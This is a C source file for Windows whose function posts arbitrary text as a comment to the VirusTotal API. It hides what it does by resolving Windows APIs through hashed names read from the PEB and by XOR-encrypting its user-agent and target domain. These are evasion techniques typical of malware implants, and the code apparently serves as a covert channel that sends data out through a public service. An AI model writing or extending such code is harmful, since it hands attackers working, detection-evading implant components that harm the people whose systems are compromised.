#include "commun.h"
#include "getaddress.h"
#include "crypto.h"


#define InternetOpenA_h         0x53a601db
#define InternetConnectA_h      0x2fee2053
#define memset_h                0x4196aa
#define lstrcatA_h              0x70b0105d
#define HttpOpenRequestA_h      0xdc9778db
#define lstrlenA_h              0x70b51004
#define HttpSendRequestA_h      0x7cebd4b3
#define sprintf_h               0xf04fbcc5
#define VirtualAlloc_h          0x715a6191
#define InternetReadFile_h      0xe6ea4da4
#define InternetCloseHandle_h   0x2854d3aa

typedef LPVOID HINTERNET;
typedef HINTERNET* LPHINTERNET;


typedef HINTERNET (WINAPI* InternetOpenA_t)(
    LPCSTR lpszAgent,
    DWORD  dwAccessType,
    LPCSTR lpszProxy,
    LPCSTR lpszProxyBypass,
    DWORD  dwFlags
);

typedef HINTERNET (WINAPI* InternetConnectA_t)(
    HINTERNET     hInternet,
    LPCSTR        lpszServerName,
    WORD          nServerPort,
    LPCSTR        lpszUserName,
    LPCSTR        lpszPassword,
    DWORD         dwService,
    DWORD         dwFlags,
    DWORD_PTR     dwContext
);

typedef HINTERNET (WINAPI* HttpOpenRequestA_t)(
    HINTERNET hConnect,
    LPCSTR    lpszVerb,
    LPCSTR    lpszObjectName,
    LPCSTR    lpszVersion,
    LPCSTR    lpszReferrer,
    LPCSTR* lplpszAcceptTypes,
    DWORD     dwFlags,
    DWORD_PTR dwContext
);

typedef void* (WINAPI* memset_t)(
    void* dest,
    int c,
    size_t count
);

typedef LPSTR (WINAPI* lstrcatA_t)(
    LPSTR  lpString1,
    LPCSTR lpString2
);


typedef int (WINAPI* lstrlenA_t)(
    LPCSTR lpString
);

typedef BOOL (WINAPI* HttpSendRequestA_t)(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength
);

typedef LPVOID (WINAPI* VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

typedef BOOL (WINAPI* InternetReadFile_t)(
    HINTERNET hFile,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead
);

typedef BOOL(WINAPI* InternetCloseHandle_t)(
    HINTERNET hInternet
    );


const char* PostComment(const char* APIkey, const char* Hash, const char* comment)
{
    InternetOpenA_t InternetOpenAFunc = (InternetOpenA_t)PEBGetAddr(InternetOpenA_h);
    InternetConnectA_t InternetConnectAFunc = (InternetConnectA_t)PEBGetAddr(InternetConnectA_h);
    HttpOpenRequestA_t HttpOpenRequestAFunc = (HttpOpenRequestA_t)PEBGetAddr(HttpOpenRequestA_h);
    memset_t memsetFunc = (memset_t)PEBGetAddr(memset_h);
    lstrcatA_t lstrcatAFunc = (lstrcatA_t)PEBGetAddr(lstrcatA_h);
    lstrlenA_t lstrlenAFunc = (lstrlenA_t)PEBGetAddr(lstrlenA_h);
    HttpSendRequestA_t HttpSendRequestAFunc = (HttpSendRequestA_t)PEBGetAddr(HttpSendRequestA_h);
    VirtualAlloc_t VirtualAllocFunc = (VirtualAlloc_t)PEBGetAddr(VirtualAlloc_h);
    InternetReadFile_t InternetReadFileFunc = (InternetReadFile_t)PEBGetAddr(InternetReadFile_h);
    InternetCloseHandle_t InternetCloseHandleFunc = (InternetCloseHandle_t)PEBGetAddr(InternetCloseHandle_h);

    char agent[] = { 0xe7, 0xc5, 0xd0, 0xc3, 0xc6, 0xc6, 0xcb, 0x85, 0x9f, 0x84, 0x9a, 0x8a, 0x82, 0xfd, 0xc3, 0xc4, 0xce, 0xc5, 0xdd, 0xd9, 0x8a, 0xe4, 0xfe, 0x8a, 0x9b, 0x9a, 0x84, 0x9a, 0x91, 0x8a, 0xfd, 0xc3, 0xc4, 0x9c, 0x9e, 0x91, 0x8a, 0xd2, 0x9c, 0x9e, 0x83, 0x8a, 0xeb, 0xda, 0xda, 0xc6, 0xcf, 0xfd, 0xcf, 0xc8, 0xe1, 0xc3, 0xde, 0x85, 0x9f, 0x99, 0x9d, 0x84, 0x99, 0x9c, 0x8a, 0x82, 0xe1, 0xe2, 0xfe, 0xe7, 0xe6, 0x86, 0x8a, 0xc6, 0xc3, 0xc1, 0xcf, 0x8a, 0xed, 0xcf, 0xc9, 0xc1, 0xc5, 0x83, 0x8a, 0xe9, 0xc2, 0xd8, 0xc5, 0xc7, 0xcf, 0x85, 0x9d, 0x9e, 0x84, 0x9a, 0x84, 0x99, 0x9d, 0x98, 0x93, 0x84, 0x9b, 0x9c, 0x93, 0x8a, 0xf9, 0xcb, 0xcc, 0xcb, 0xd8, 0xc3, 0x85, 0x9f, 0x99, 0x9d, 0x84, 0x99, 0x9c, 0xaa };
    xor_aa_byte(agent, sizeof(agent));
    HINTERNET hInternet = InternetOpenAFunc(agent, 1, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return NULL;
    }
    xor_aa_byte(agent, sizeof(agent));


    //char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
    char domain[] = { 0xdd, 0xdd, 0xdd, 0x84, 0xdc, 0xc3, 0xd8, 0xdf, 0xd9, 0xde, 0xc5, 0xde, 0xcb, 0xc6, 0x84, 0xc9, 0xc5, 0xc7, 0xaa };
    xor_aa_byte(domain, sizeof(domain));
    HINTERNET hConnect = InternetConnectAFunc(hInternet, domain, 443, NULL, NULL, 3, 0, (DWORD_PTR)NULL);
    if (!hConnect)
    {
        return NULL;
    }
    xor_aa_byte(domain, sizeof(domain));

    CHAR aTypes[] = { '*','/','*',0 };
    PCTSTR acceptTypes[] = { (LPCTSTR)aTypes, NULL };
    CHAR Postm[] = { 'P','O','S','T',0 };
    // /api/v3/files/{Hash}/comments
    CHAR path[1000];
    memsetFunc(path, 0, sizeof(path));
    char repos[] = { 'a','p','i','/','v','3','/','f','i','l','e','s','/',0 };
    lstrcatAFunc(path, repos);
    lstrcatAFunc(path, Hash);
    lstrcatAFunc(path, "/");
    char cmts[] = { 'c','o','m','m','e','n','t','s',0 };
    lstrcatAFunc(path, cmts);
    HINTERNET hRequest = HttpOpenRequestAFunc(hConnect, Postm, path, NULL, NULL, (LPCSTR*)acceptTypes, 0x00800000 | 0x04000000, 0);
    if (!hRequest) 
    {
        return NULL;
    }

    CHAR headers[4000];
    memsetFunc(headers, 0, sizeof(headers));
    // x-apikey: <your API key>
    CHAR cType[] = { 'a','c','c','e','p','t',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'x','-','a','p','i','k','e','y',':',' ',0 };
    lstrcatAFunc(headers, cType);
    lstrcatAFunc(headers, APIkey);
    int headerLen = lstrlenAFunc(headers);
    char data[100000];
    memsetFunc(data, 0, sizeof(data));

    sprintf(data, "{\"data\":{\"type\":\"comment\",\"attributes\":{\"text\":\"%s\"}}}", comment);

    int dataLen = lstrlenAFunc(data);
    BOOL bRequestSent = HttpSendRequestAFunc(hRequest, headers, headerLen, data, dataLen);
    if (!bRequestSent)
    {
        return NULL;
    }
    BOOL bIRF = TRUE;
    const int buffLen = 100000; 
    char* buffer = (char*)VirtualAllocFunc(0, 100000, 0x1000, 0x04);
    DWORD dwNumberOfBytesRead = -1;
    while (bIRF && dwNumberOfBytesRead != 0) {
        bIRF = InternetReadFileFunc(hRequest, buffer, buffLen, &dwNumberOfBytesRead);
    }
    InternetCloseHandleFunc(hRequest);
    InternetCloseHandleFunc(hConnect);
    InternetCloseHandleFunc(hInternet);
    return "Finish";
}
